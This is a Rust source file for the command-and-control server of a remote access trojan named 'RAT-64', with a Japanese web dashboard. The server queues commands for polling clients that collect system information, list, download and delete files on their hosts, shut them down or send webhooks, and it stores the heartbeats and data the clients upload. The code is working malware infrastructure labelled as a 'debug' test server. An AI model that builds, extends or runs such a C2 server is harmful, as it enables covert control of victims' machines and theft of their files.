use std::{convert::Infallible, net::SocketAddr, sync::Arc};

use bytes::Bytes;
use chrono::Utc;
use http_body_util::{BodyExt, Full};
use hyper::body::Incoming;
use hyper::server::conn::http1;
use hyper::service::service_fn;
use hyper::{header::CONTENT_TYPE, Method, Request, Response, StatusCode};
use hyper_util::rt::TokioIo;
use serde::{Deserialize, Serialize};
use serde_json::{json, Value};
use tokio::{net::TcpListener, sync::{Mutex, Notify}, time};
// Safe diagnostics from library (no secrets)
use rat_64::collectors::network_diagnostics::collect_network_diagnostics;
use rat_64::get_system_info;


const AUTH_TOKEN: &str = "SECURE_TOKEN_32_CHARS_MINIMUM_LEN";
const PORT: u16 = 8080;

#[derive(Serialize, Deserialize, Clone, Debug)]
struct Command {
    id: String,
    command_type: String,
    parameters: Vec<String>,
    timestamp: u64,
    auth_token: String,
}

#[derive(Serialize, Clone, Debug)]
struct LogEntry {
    timestamp: u64,
    level: String,
    message: String,
    client_id: Option<String>,
    command_id: Option<String>,
    details: Option<Value>,
}

struct AppState {
    command_queue: Mutex<Vec<Command>>,
    response_log: Mutex<Vec<Value>>,
    activity_log: Mutex<Vec<LogEntry>>,
    notify: Notify,
    server_start: u64,
}

fn unix_time() -> u64 { Utc::now().timestamp() as u64 }

async fn log_activity(state: &AppState, level: &str, message: &str, client_id: Option<&str>, command_id: Option<&str>, details: Option<Value>) {
    let entry = LogEntry {
        timestamp: unix_time(),
        level: level.to_string(),
        message: message.to_string(),
        client_id: client_id.map(str::to_string),
        command_id: command_id.map(str::to_string),
        details,
    };
    
    let mut log = state.activity_log.lock().await;
    log.push(entry);
    
    // 最新1000件まで保持
    if log.len() > 1000 {
        let excess = log.len() - 1000;
        log.drain(0..excess);
    }
}

async fn handle_simple_command(state: &AppState, prefix: &str, command_type: &str) -> Result<Response<Full<Bytes>>, Infallible> {
    let id = format!("{}_{}", prefix, Utc::now().timestamp_millis());
    let cmd = Command {
        id: id.clone(),
        command_type: command_type.to_string(),
        parameters: vec![],
        timestamp: unix_time(),
        auth_token: AUTH_TOKEN.to_string(),
    };
    
    state.command_queue.lock().await.push(cmd);
    state.notify.notify_waiters();
    
    log_activity(state, "INFO", &format!("{} command queued", command_type), None, Some(&id), 
                Some(json!({"command_type": command_type}))).await;
    println!("[UI] {} command added: {}", command_type, id);
    
    Ok(json_response(json!({"ok": true}), StatusCode::OK))
}

async fn handle_file_command(state: &AppState, prefix: &str, command_type: &str, params: Vec<&str>) -> Result<Response<Full<Bytes>>, Infallible> {
    let id = format!("{}_{}", prefix, Utc::now().timestamp_millis());
    let cmd = Command {
        id: id.clone(),
        command_type: command_type.to_string(),
        parameters: params.into_iter().map(String::from).collect(),
        timestamp: unix_time(),
        auth_token: AUTH_TOKEN.to_string(),
    };
    
    state.command_queue.lock().await.push(cmd);
    state.notify.notify_waiters();
    println!("[UI] {} command added: {}", command_type, id);
    
    Ok(json_response(json!({"ok": true}), StatusCode::OK))
}

async fn extract_json_body(req: Request<Incoming>) -> Result<Value, String> {
    let body = req.into_body().collect().await
        .map_err(|_| "Failed to read body")?
        .to_bytes();
    
    if body.is_empty() {
        return Err("Empty body".to_string());
    }
    
    serde_json::from_slice(&body)
        .map_err(|_| "Invalid JSON".to_string())
}

async fn handle_file_operation(state: &AppState, req: Request<Incoming>, operation: &str, command_type: &str) -> Result<Response<Full<Bytes>>, Infallible> {
    match extract_json_body(req).await {
        Ok(data) => {
            if let Some(path) = data.get("path").and_then(|p| p.as_str()) {
                let id = format!("{}_{}", operation, Utc::now().timestamp_millis());
                let params = match operation {
                    "delete" => vec![path.to_string(), "false".to_string()],
                    "create_dir" => vec![path.to_string(), "true".to_string()],
                    _ => vec![path.to_string()],
                };
                
                let cmd = Command {
                    id: id.clone(),
                    command_type: command_type.to_string(),
                    parameters: params,
                    timestamp: unix_time(),
                    auth_token: AUTH_TOKEN.to_string(),
                };
                
                state.command_queue.lock().await.push(cmd);
                state.notify.notify_waiters();
                println!("[UI] {} command added: {} (path: {})", operation, id, path);
                Ok(json_response(json!({"ok": true}), StatusCode::OK))
            } else {
                Ok(json_response(json!({"error": "path parameter required"}), StatusCode::BAD_REQUEST))
            }
        }
        Err(_) => Ok(json_response(json!({"error": "Invalid JSON"}), StatusCode::BAD_REQUEST))
    }
}

async fn handle_client_json_request<F>(
    state: &AppState,
    req: Request<Incoming>,  
    processor: F,
    response_status: &str
) -> Result<Response<Full<Bytes>>, Infallible>
where
    F: FnOnce(Value) -> Value,
{
    match extract_json_body(req).await {
        Ok(data) => {
            let processed_data = processor(data);
            
            // レスポンス用のログでない場合はログに記録
            if response_status != "received" {
                state.response_log.lock().await.push(processed_data);
            } else {
                state.response_log.lock().await.push(processed_data.clone());
            }
            
            Ok(json_response(json!({"status": response_status}), StatusCode::OK))
        }
        Err(_) => Ok(json_response(json!({"error": "No JSON data provided"}), StatusCode::BAD_REQUEST))
    }
}

fn json_response(v: Value, status: StatusCode) -> Response<Full<Bytes>> {
    let body = serde_json::to_vec(&v).unwrap_or_else(|_| b"{}".to_vec());
    Response::builder()
        .status(status)
        .header(CONTENT_TYPE, "application/json")
        .body(Full::new(Bytes::from(body)))
        .unwrap()
}

fn unauthorized() -> Response<Full<Bytes>> {
    json_response(json!({"error": "Unauthorized"}), StatusCode::UNAUTHORIZED)
}

fn is_authorized(req: &Request<Incoming>) -> bool {
    if let Some(h) = req.headers().get("Authorization").and_then(|h| h.to_str().ok()) {
        if let Some(token) = h.strip_prefix("Bearer ") {
            return token == AUTH_TOKEN;
        }
    }
    false
}

fn log_request(method: &Method, endpoint: &str, remote: &SocketAddr, data: Option<&Value>) {
    let timestamp = Utc::now().format("%Y-%m-%d %H:%M:%S");
    println!("[{}] {} {} - {}", timestamp, method, endpoint, remote);
    if let Some(d) = data {
        if let Ok(s) = serde_json::to_string_pretty(d) { println!("  Data: {}", s); }
    }
}

fn parse_query_param(req: &Request<Incoming>, key: &str) -> Option<String> {
    req.uri().query()?.split('&')
        .find_map(|pair| {
            let mut parts = pair.splitn(2, '=');
            match (parts.next()?, parts.next()) {
                (k, Some(v)) if k == key => Some(v.to_string()),
                (k, None) if k == key => Some(String::new()),
                _ => None,
            }
        })
}

fn parse_query_bool(req: &Request<Incoming>, key: &str) -> bool {
    matches!(parse_query_param(req, key).as_deref(), Some("1" | "true" | "yes"))
}

fn parse_query_u64(req: &Request<Incoming>, key: &str, default: u64) -> u64 {
    parse_query_param(req, key)
        .and_then(|v| v.parse().ok())
        .unwrap_or(default)
}

fn html_response(html: &str) -> Response<Full<Bytes>> {
    Response::builder()
        .status(StatusCode::OK)
        .header(CONTENT_TYPE, "text/html; charset=utf-8")
        .header(hyper::header::CACHE_CONTROL, "no-store, no-cache, must-revalidate, max-age=0")
        .header(hyper::header::PRAGMA, "no-cache")
        .header(hyper::header::EXPIRES, "0")
        .body(Full::new(Bytes::from(html.to_owned())))
        .unwrap()
}

fn index_page(queue_size: usize, resp_count: usize) -> String {
    format!(
        r#"<!doctype html>
<html lang="ja">
<head>
  <meta charset="utf-8" />
  <title>RAT-64 C2 Server (Debug)</title>
  <style>
    body {{ 
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
      margin: 0; 
      padding: 20px;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      min-height: 100vh;
      color: #333;
    }}
    .container {{
      max-width: 1200px;
      margin: 0 auto;
      background: rgba(255, 255, 255, 0.95);
      border-radius: 15px;
      padding: 30px;
      box-shadow: 0 20px 40px rgba(0,0,0,0.1);
    }}
    .header {{
      text-align: center;
      margin-bottom: 30px;
      padding-bottom: 20px;
      border-bottom: 2px solid #e0e0e0;
    }}
    .header h1 {{
      margin: 0;
      color: #4a5568;
      font-size: 2.5em;
      font-weight: 300;
    }}
    .status-bar {{
      display: flex;
      justify-content: space-between;
      align-items: center;
      background: #f8f9fa;
      padding: 15px 20px;
      border-radius: 10px;
      margin-bottom: 25px;
      border-left: 4px solid #28a745;
    }}
    .status-item {{
      display: flex;
      align-items: center;
      gap: 8px;
    }}
    .status-badge {{
      background: #28a745;
      color: white;
      padding: 4px 12px;
      border-radius: 20px;
      font-size: 12px;
      font-weight: bold;
    }}
    .grid {{ 
      display: grid; 
      gap: 20px; 
      grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); 
      margin-bottom: 30px;
    }}
    .card {{ 
      background: white;
      border: none;
      padding: 25px; 
      border-radius: 12px; 
      box-shadow: 0 4px 15px rgba(0,0,0,0.08);
      transition: transform 0.2s ease, box-shadow 0.2s ease;
    }}
    .card:hover {{
      transform: translateY(-2px);
      box-shadow: 0 8px 25px rgba(0,0,0,0.15);
    }}
    .card h3 {{
      margin: 0 0 20px 0;
      color: #2d3748;
      font-size: 1.3em;
      font-weight: 600;
      display: flex;
      align-items: center;
      gap: 10px;
    }}
    .card-icon {{
      font-size: 1.5em;
    }}
    button {{ 
      padding: 12px 18px; 
      font-size: 14px; 
      cursor: pointer;
      border: none;
      border-radius: 8px;
      font-weight: 500;
      transition: all 0.2s ease;
      margin: 4px;
      min-width: 120px;
    }}
    .btn-primary {{
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      color: white;
    }}
    .btn-primary:hover {{
      transform: translateY(-1px);
      box-shadow: 0 4px 12px rgba(102, 126, 234, 0.4);
    }}
    .btn-success {{
      background: linear-gradient(135deg, #56ab2f 0%, #a8e6cf 100%);
      color: #2d3748;
    }}
    .btn-success:hover {{
      transform: translateY(-1px);
      box-shadow: 0 4px 12px rgba(86, 171, 47, 0.4);
    }}
    .btn-warning {{
      background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
      color: white;
    }}
    .btn-warning:hover {{
      transform: translateY(-1px);
      box-shadow: 0 4px 12px rgba(240, 147, 251, 0.4);
    }}
    .btn-danger {{
      background: linear-gradient(135deg, #ff6b6b 0%, #ee5a24 100%);
      color: white;
    }}
    .btn-danger:hover {{
      transform: translateY(-1px);
      box-shadow: 0 4px 12px rgba(255, 107, 107, 0.4);
    }}
    .input-group {{
      display: flex;
      gap: 10px;
      margin: 10px 0;
      align-items: center;
    }}
    .input-group input {{
      flex: 1;
      padding: 12px 16px;
      border: 2px solid #e2e8f0;
      border-radius: 8px;
      font-size: 14px;
      transition: border-color 0.2s ease;
    }}
    .input-group input:focus {{
      outline: none;
      border-color: #667eea;
      box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
    }}
    .input-group label {{
      min-width: 100px;
      font-weight: 500;
      color: #4a5568;
    }}
    .command-log {{
      background: #1a202c;
      color: #e2e8f0;
      padding: 20px;
      border-radius: 10px;
      font-family: 'Consolas', 'Monaco', monospace;
      font-size: 13px;
      max-height: 400px;
      overflow-y: auto;
      margin-top: 20px;
      border: 1px solid #2d3748;
      line-height: 1.6;
      white-space: pre-wrap;
    }}
    .command-log::-webkit-scrollbar {{
      width: 8px;
    }}
    .command-log::-webkit-scrollbar-track {{
      background: #2d3748;
      border-radius: 4px;
    }}
    .command-log::-webkit-scrollbar-thumb {{
      background: #4a5568;
      border-radius: 4px;
    }}
    .command-log::-webkit-scrollbar-thumb:hover {{
      background: #718096;
    }}
    .footer {{
      text-align: center;
      padding-top: 20px;
      border-top: 1px solid #e2e8f0;
      color: #718096;
      font-size: 14px;
    }}
    .quick-actions {{
      display: flex;
      gap: 10px;
      flex-wrap: wrap;
      margin: 15px 0;
    }}
    .quick-actions button {{
      min-width: auto;
      padding: 8px 12px;
      font-size: 13px;
    }}
    .status-badge.online {{
      background: #28a745;
    }}
    .status-badge.offline {{
      background: #dc3545;
    }}
    .toast {{
      animation: slideIn 0.3s ease;
    }}
    @keyframes slideIn {{
      from {{ transform: translateX(100%); opacity: 0; }}
      to {{ transform: translateX(0); opacity: 1; }}
    }}
    button:disabled {{
      opacity: 0.6;
      cursor: not-allowed;
      transform: none !important;
    }}
    .card p {{
      margin: 10px 0;
      line-height: 1.5;
    }}
  </style>
  <script>
    let commandCount = 0;
    let isOnline = false;
    
    function updateStatus() {{
      fetch('/api/status')
        .then(r => r.json())
        .then(data => {{
          isOnline = data.clients > 0;
          document.getElementById('client-status').textContent = 
            isOnline ? 'オンライン' : 'オフライン';
          document.getElementById('client-status').className = 
            'status-badge ' + (isOnline ? 'online' : 'offline');
          document.getElementById('client-count').textContent = data.clients || 0;
          document.getElementById('queue-count').textContent = data.queue || 0;
          document.getElementById('log-count').textContent = data.logs || 0;
        }})
        .catch(() => {{
          document.getElementById('client-status').textContent = 'エラー';
          document.getElementById('client-status').className = 'status-badge offline';
        }});
    }}
    
    function updateLogs() {{
      fetch('/api/logs?limit=50')
        .then(r => r.json())
        .then(data => {{
          const logContainer = document.getElementById('command-log');
          if (data.logs && data.logs.length > 0) {{
            logContainer.innerHTML = data.logs.map(log => {{
              const timestamp = new Date(log.timestamp * 1000).toLocaleTimeString('ja-JP');
              const levelColor = {{
                'INFO': '#28a745',
                'HEARTBEAT': '#007bff', 
                'WARNING': '#ffc107',
                'ERROR': '#dc3545',
                'SUCCESS': '#28a745'
              }}[log.level] || '#6c757d';
              
              let message = `[${{timestamp}}] <span style="color: ${{levelColor}}; font-weight: bold;">${{log.level}}</span> ${{log.message}}`;
              
              if (log.client_id) {{
                message += ` <span style="color: #6f42c1;">[Client: ${{log.client_id}}]</span>`;
              }}
              
              if (log.command_id) {{
                message += ` <span style="color: #fd7e14;">[Cmd: ${{log.command_id.substring(0, 8)}}...]</span>`;
              }}
              
              return message;
            }}).join('\n');
            logContainer.scrollTop = logContainer.scrollHeight;
          }}
        }})
        .catch(e => {{
          console.error('Failed to fetch logs:', e);
        }});
    }}
    
    function showToast(message, type = 'info') {{
      const toast = document.createElement('div');
      toast.className = `toast toast-${{type}}`;
      toast.textContent = message;
      toast.style.cssText = `
        position: fixed; top: 20px; right: 20px; z-index: 1000;
        padding: 15px 20px; border-radius: 8px; color: white;
        font-weight: 500; opacity: 0; transform: translateX(100%);
        transition: all 0.3s ease;
        background: ${{type === 'success' ? '#28a745' : type === 'error' ? '#dc3545' : '#007bff'}};
      `;
      document.body.appendChild(toast);
      
      setTimeout(() => {{
        toast.style.opacity = '1';
        toast.style.transform = 'translateX(0)';
      }}, 100);
      
      setTimeout(() => {{
        toast.style.opacity = '0';
        toast.style.transform = 'translateX(100%)';
        setTimeout(() => document.body.removeChild(toast), 300);
      }}, 3000);
    }}
    
    function post(path, body, successMessage) {{
      const button = event.target;
      const originalText = button.textContent;
      button.disabled = true;
      button.textContent = '実行中...';
      
      const opts = {{ method: 'POST' }};
      if (body !== undefined) {{
        opts.headers = {{ 'Content-Type': 'application/json' }};
        opts.body = JSON.stringify(body);
      }}
      
      fetch(path, opts)
        .then(response => {{
          if (response.ok) {{
            commandCount++;
            showToast(successMessage || 'コマンドが送信されました', 'success');
            addToLog(`[SENT] ${{path}} - ${{successMessage || 'Command sent'}}`);
            updateStatus();
          }} else {{
            throw new Error(`HTTP ${{response.status}}`);
          }}
        }})
        .catch(e => {{
          showToast(`エラー: ${{e.message}}`, 'error');
          addToLog(`[ERROR] ${{path}} - ${{e.message}}`);
        }})
        .finally(() => {{
          button.disabled = false;
          button.textContent = originalText;
        }});
    }}
    
    function addToLog(message) {{
      const log = document.getElementById('command-log');
      const timestamp = new Date().toLocaleTimeString();
      log.innerHTML += `[${{timestamp}}] ${{message}}\n`;
      log.scrollTop = log.scrollHeight;
    }}
    
    function clearLog() {{
      fetch('/api/logs/clear', {{ method: 'POST' }})
        .then(response => {{
          if (response.ok) {{
            document.getElementById('command-log').innerHTML = ''; 
            showToast('サーバーログをクリアしました', 'success');
            updateLogs(); // ログを再読み込み
          }} else {{
            showToast('ログクリアに失敗しました', 'error');
          }}
        }})
        .catch(e => {{
          document.getElementById('command-log').innerHTML = '';
          showToast('ローカルログをクリアしました', 'info');
        }});
    }}
    
    function fileInfo() {{
      const path = document.getElementById('file_path').value.trim();
      if (!path) {{ 
        showToast('ファイルパスを入力してください', 'error'); 
        return; 
      }}
      post('/ui/add-file-info', {{ path: path }}, `ファイル情報取得: ${{path}}`);
    }}
    
    function downloadFile() {{
      const path = document.getElementById('file_path').value.trim();
      if (!path) {{ 
        showToast('ファイルパスを入力してください', 'error'); 
        return; 
      }}
      post('/ui/add-download-file', {{ path: path }}, `ファイルダウンロード: ${{path}}`);
    }}
    
    function deleteFile() {{
      const path = document.getElementById('file_path').value.trim();
      if (!path) {{ 
        showToast('ファイルパスを入力してください', 'error'); 
        return; 
      }}
      if (!confirm(`本当に削除しますか？\n\n${{path}}`)) return;
      post('/ui/add-delete-file', {{ path: path }}, `ファイル削除: ${{path}}`);
    }}
    
    function createDir() {{
      const path = document.getElementById('dir_path').value.trim();
      if (!path) {{ 
        showToast('ディレクトリパスを入力してください', 'error'); 
        return; 
      }}
      post('/ui/add-create-dir', {{ path: path }}, `ディレクトリ作成: ${{path}}`);
    }}
    
    
    // 初期化
    document.addEventListener('DOMContentLoaded', function() {{
      updateStatus();
      updateLogs();
      setInterval(updateStatus, 5000); // 5秒ごとにステータス更新
      setInterval(updateLogs, 3000);   // 3秒ごとにログ更新
      addToLog('RAT-64 C2 Server WebUI 初期化完了');
    }});
  </script>
</head>
<body>
  <div class="container">
    <div class="header">
      <h1>🐀 RAT-64 C2 Command Center</h1>
    </div>
    
    <div class="status-bar">
      <div class="status-item">
        <strong>クライアント状態:</strong>
        <span id="client-status" class="status-badge">確認中...</span>
      </div>
      <div class="status-item">
        <strong>接続数:</strong>
        <span id="client-count">0</span>
      </div>
      <div class="status-item">
        <strong>キュー:</strong>
        <span id="queue-count">{queue}</span>
      </div>
      <div class="status-item">
        <strong>レスポンス:</strong>
        <span>{resp}</span>
      </div>
      <div class="status-item">
        <strong>ログ:</strong>
        <span id="log-count">0</span>
      </div>
    </div>

    <div class="grid">
      <div class="card">
        <h3><span class="card-icon"></span>基本コマンド</h3>
        <button type="button" class="btn-primary" onclick="post('/ui/add-status', null, 'ステータス確認コマンド送信')">Status Check</button>
        <button type="button" class="btn-primary" onclick="post('/ui/add-ping', null, 'Pingコマンド送信')">Ping Test</button>
        <button type="button" class="btn-success" onclick="post('/ui/add-collect', null, 'システム情報収集開始')">Collect System Info</button>
        <button type="button" class="btn-danger" onclick="post('/ui/add-shutdown', null, 'シャットダウンコマンド送信')">Shutdown</button>
      </div>

      <div class="card">
        <h3><span class="card-icon"></span>ファイル管理</h3>
        
        

        
          
          
          
          
          
        
        <div class="input-group">
          <label>ファイルパス:</label>
          <input type="text" id="file_path" placeholder="例: C:\Windows\notepad.exe">
        </div>
        
        <div style="margin: 10px 0;">
          <button type="button" class="btn-primary" onclick="fileInfo()">File Info</button>
          <button type="button" class="btn-success" onclick="downloadFile()">⬇Download</button>
          <button type="button" class="btn-danger" onclick="deleteFile()">Delete</button>
        </div>

        <div class="input-group">
          <label>ディレクトリ:</label>
          <input type="text" id="dir_path" placeholder="例: C:\NewFolder">
        </div>
        
        <button type="button" class="btn-success" onclick="createDir()">Create Directory</button>
      </div>

      <div class="card">
        <h3><span class="card-icon"></span>Webhook</h3>
        <button type="button" class="btn-warning" onclick="post('/ui/queue-webhook', null, 'Webhook送信コマンド投入')">Send Webhook</button>
        <p style="margin-top: 15px; color: #666; font-size: 14px;">
          クライアント経由でWebhookを送信します。Discord等の外部サービスに通知を送信できます。
        </p>
      </div>
    </div>

    <div class="card">
      <h3><span class="card-icon"></span>コマンドログ</h3>
      <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
        <span style="color: #666;">リアルタイムコマンド実行ログ</span>
        <button type="button" class="btn-primary" onclick="clearLog()">Clear Log</button>
      </div>
      <div id="command-log" class="command-log">
        起動中... ログの初期化を待機しています。
      </div>
    </div>

    <div class="footer">
      <p>RAT-64 C2 Server v2.0 | Secure Command & Control Interface</p>
      <p style="font-size: 12px; margin-top: 10px;">
        このインターフェースは認証不要のデバッグ用途です。本番環境では適切な認証を実装してください。
      </p>
    </div>
  </div>
  <p class="small">このページの操作は認証不要（デバッグ用途）。クライアントAPIはBearer認証が必要です。</p>
</body>
</html>"#,
        queue = queue_size,
        resp = resp_count
    )
}

async fn handle(req: Request<Incoming>, remote: SocketAddr, state: Arc<AppState>) -> Result<Response<Full<Bytes>>, Infallible> {
    let method = req.method().clone();
    let path = req.uri().path().to_string();

    match (method.clone(), path.as_str()) {
        (Method::GET, "/") => {
            let q = state.command_queue.lock().await;
            let r = state.response_log.lock().await;
            let page = index_page(q.len(), r.len());
            Ok(html_response(&page))
        }

        // UI state (JSON)
        (Method::GET, "/ui/state") => {
            let q = state.command_queue.lock().await;
            let r = state.response_log.lock().await;
            let recent: Vec<Value> = r.iter().rev().take(20).cloned().collect();
            Ok(json_response(json!({
                "queue_count": q.len(),
                "responses": recent
            }), StatusCode::OK))
        }

        // 基本コマンド（認証不要）
        (Method::POST, "/ui/add-status") => handle_simple_command(&state, "status", "status").await,
        (Method::POST, "/ui/add-ping") => handle_simple_command(&state, "ping", "ping").await,
        (Method::POST, "/ui/add-collect") => handle_simple_command(&state, "collect", "collect_system_info").await,
        (Method::POST, "/ui/add-shutdown") => handle_simple_command(&state, "shutdown", "shutdown").await,

        // ファイル管理コマンド（固定パス）
        (Method::POST, "/ui/add-list-files") => handle_file_command(&state, "list_files", "list_files", vec![".", "false"]).await,
        (Method::POST, "/ui/add-list-files-win") => handle_file_command(&state, "list_files_win", "list_files", vec!["C:\\", "false"]).await,
        // ファイル操作（JSONパラメータ付き）
        (Method::POST, "/ui/add-file-info") => handle_file_operation(&state, req, "file_info", "get_file_info").await,
        (Method::POST, "/ui/add-download-file") => handle_file_operation(&state, req, "download", "download_file").await,
        (Method::POST, "/ui/add-delete-file") => handle_file_operation(&state, req, "delete", "delete_file").await,
        (Method::POST, "/ui/add-create-dir") => handle_file_operation(&state, req, "create_dir", "create_dir").await,



        // Webhook
        (Method::POST, "/ui/queue-webhook") => handle_simple_command(&state, "webhook", "webhook_send").await,

        // Client endpoints ---------------------------------------------

        // Client endpoints ---------------------------------------------
        (Method::GET, "/api/commands/fetch") => {
            log_request(&method, &path, &remote, None);
            if !is_authorized(&req) { return Ok(unauthorized()); }
            let client_id = parse_query_param(&req, "client_id").unwrap_or_else(|| "unknown".into());
            let wait = parse_query_bool(&req, "wait");
            let timeout_secs = parse_query_u64(&req, "timeout", 25);

            let mut cmds: Vec<Command> = {
                let mut q = state.command_queue.lock().await;
                q.drain(..).collect()
            };
            if cmds.is_empty() && wait {
                let _ = time::timeout(std::time::Duration::from_secs(timeout_secs), state.notify.notified()).await;
                let mut q = state.command_queue.lock().await;
                cmds = q.drain(..).collect();
            }
            if !cmds.is_empty() { println!("  → Returning {} command(s) for client: {}", cmds.len(), client_id); }
            Ok(json_response(serde_json::to_value(cmds).unwrap_or_else(|_| json!([])), StatusCode::OK))
        }

        (Method::POST, "/api/commands/response") => {
            if !is_authorized(&req) { return Ok(unauthorized()); }
            handle_client_json_request(&state, req, |mut data| {
                if let Some(obj) = data.as_object_mut() {
                    obj.insert("received_at".into(), Value::String(Utc::now().to_rfc3339()));
                    obj.insert("server_timestamp".into(), Value::from(unix_time()));
                }
                data
            }, "received").await
        }

        (Method::POST, "/api/heartbeat") => {
            if !is_authorized(&req) { return Ok(unauthorized()); }
            handle_client_json_request(&state, req, |data| {
                let client_id = data.get("client_id").and_then(|v| v.as_str()).unwrap_or("unknown");
                let hostname = data.get("hostname").and_then(|v| v.as_str()).unwrap_or("unknown");
                let status = data.get("status").and_then(|v| v.as_str()).unwrap_or("unknown");
                
                tokio::spawn({
                    let state = state.clone();
                    let data = data.clone();
                    let client_id = client_id.to_string();
                    let hostname = hostname.to_string();
                    let status = status.to_string();
                    async move {
                        log_activity(&state, "HEARTBEAT", &format!("Client {}@{} status: {}", client_id, hostname, status), Some(&client_id), None, Some(data)).await;
                    }
                });
                
                println!("  → Heartbeat from {}@{}: {}", client_id, hostname, status);
                data
            }, "received").await
        }

        (Method::POST, "/api/data/upload") => {
            if !is_authorized(&req) { return Ok(unauthorized()); }
            handle_client_json_request(&state, req, |data| {
                let client_id = data.get("client_id").and_then(|v| v.as_str()).unwrap_or("unknown");
                let data_type = data.get("data_type").and_then(|v| v.as_str()).unwrap_or("unknown");
                let filename = format!("uploaded_data_{}_{}.json", client_id, unix_time());
                
                if let Err(e) = std::fs::write(&filename, serde_json::to_string_pretty(&data).unwrap_or_else(|_| "{}".to_string())) {
                    eprintln!("Failed to save {}: {}", filename, e);
                } else {
                    println!("  → Data upload from {}: {} saved to {}", client_id, data_type, filename);
                }
                data
            }, "uploaded").await
        }

        (Method::GET, "/api/status") => {
            let q = state.command_queue.lock().await;
            let r = state.response_log.lock().await;
            let l = state.activity_log.lock().await;
            let status = serde_json::json!({
                "queue": q.len(),
                "responses": r.len(),
                "logs": l.len(),
                "clients": if r.len() > 0 { 1 } else { 0 }, // 簡易的なクライアント検出
                "server_time": unix_time(),
                "uptime": std::time::SystemTime::now()
                    .duration_since(std::time::UNIX_EPOCH)
                    .unwrap_or_default()
                    .as_secs()
            });
            Ok(json_response(status, StatusCode::OK))
        }

        // Debug endpoints (authorized, safe, non-secret) ----------------
        (Method::GET, "/api/debug/health") => {
            if !is_authorized(&req) { return Ok(unauthorized()); }
            let q = state.command_queue.lock().await;
            let r = state.response_log.lock().await;
            let now = unix_time();
            let uptime = now.saturating_sub(state.server_start);
            let body = json!({
                "status": "ok",
                "server_time": now,
                "uptime_secs": uptime,
                "queue_len": q.len(),
                "responses_len": r.len(),
            });
            Ok(json_response(body, StatusCode::OK))
        }

        (Method::GET, "/api/debug/network") => {
            if !is_authorized(&req) { return Ok(unauthorized()); }
            let lines = collect_network_diagnostics();
            let limited: Vec<String> = lines.into_iter().take(500).collect();
            Ok(json_response(json!({"lines": limited}), StatusCode::OK))
        }

        (Method::GET, "/api/debug/sysinfo") => {
            if !is_authorized(&req) { return Ok(unauthorized()); }
            match get_system_info() {
                Ok(info) => Ok(json_response(serde_json::to_value(info).unwrap_or_else(|_| json!({"error":"serialize"})), StatusCode::OK)),
                Err(e) => Ok(json_response(json!({"error": format!("{}", e)}), StatusCode::INTERNAL_SERVER_ERROR))
            }
        }

        (Method::GET, "/api/logs") => {
            let limit = parse_query_u64(&req, "limit", 50);
            let offset = parse_query_u64(&req, "offset", 0);
            
            let logs = state.activity_log.lock().await;
            let total = logs.len();
            let start = offset.min(total as u64) as usize;
            let end = (start + limit as usize).min(total);
            
            let logs_slice: Vec<LogEntry> = if start < total {
                logs[start..end].iter().rev().cloned().collect() // 新しいものから表示
            } else {
                Vec::new()
            };
            
            let response = serde_json::json!({
                "logs": logs_slice,
                "total": total,
                "offset": offset,
                "limit": limit,
                "has_more": end < total
            });
            
            Ok(json_response(response, StatusCode::OK))
        }

        (Method::POST, "/api/logs/clear") => {
            let mut logs = state.activity_log.lock().await;
            let cleared_count = logs.len();
            logs.clear();
            log_activity(&state, "INFO", &format!("Activity log cleared ({} entries)", cleared_count), None, None, None).await;
            Ok(json_response(json!({"cleared": cleared_count, "status": "success"}), StatusCode::OK))
        }



        (Method::GET, "/api/responses") => {
            let limit = parse_query_u64(&req, "limit", 10);
            let command_id = parse_query_param(&req, "command_id");
            
            let responses = state.response_log.lock().await;
            let filtered_responses: Vec<&Value> = if let Some(cmd_id) = command_id {
                responses.iter()
                    .filter(|r| r.get("command_id").and_then(|id| id.as_str()) == Some(&cmd_id))
                    .take(limit as usize)
                    .collect()
            } else {
                responses.iter()
                    .rev()
                    .take(limit as usize)
                    .collect()
            };
            
            let response = serde_json::json!({
                "responses": filtered_responses,
                "total": responses.len()
            });
            
            Ok(json_response(response, StatusCode::OK))
        }

        _ => Ok(json_response(json!({"error":"Not Found"}), StatusCode::NOT_FOUND)),
    }
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    let state = Arc::new(AppState {
        command_queue: Mutex::new(Vec::new()),
        response_log: Mutex::new(Vec::new()),
        activity_log: Mutex::new(Vec::new()),
        notify: Notify::new(),
        server_start: unix_time(),
    });

    println!("============================================================");
    println!("🚀 RAT-64 Hyper Test Server");
    println!("============================================================");
    println!("Server URL: http://localhost:{}", PORT);
    println!("Auth Token: {}", AUTH_TOKEN);
    println!("\nUI: open http://localhost:{PORT}/ to enqueue commands and send webhook.");
    println!("  POST /test/add-status");
    println!("  POST /test/add-ping");
    println!("  POST /test/add-collect-system-info");
    println!("  POST /test/add-shutdown");
    println!("  POST /test/webhook/enable");
    println!("  POST /test/webhook/disable");
    println!("  POST /test/webhook/set-url   (JSON: {{\"url\":\"...\", \"type\":\"Discord\"}} optional)");
    println!("  POST /test/webhook/send");
    println!("\nClient endpoints (Authorization required):");
    println!("  GET  /api/commands/fetch?client_id=...");
    println!("  POST /api/commands/response");
    println!("  POST /api/heartbeat");
    println!("  POST /api/data/upload");
    println!("\nDebug endpoints (Authorization required, safe):");
    println!("  GET  /api/debug/health");
    println!("  GET  /api/debug/network");
    println!("  GET  /api/debug/sysinfo");
    println!("\nListening on http://0.0.0.0:{}", PORT);

    let listener = TcpListener::bind(("0.0.0.0", PORT)).await?;
    loop {
        let (stream, peer) = listener.accept().await?;
        let state = state.clone();
        tokio::spawn(async move {
            let io = TokioIo::new(stream);
            let service = service_fn(move |req| handle(req, peer, state.clone()));
            if let Err(err) = http1::Builder::new().serve_connection(io, service).await {
                eprintln!("Error serving connection: {:#}", err);
            }
        });
    }
}
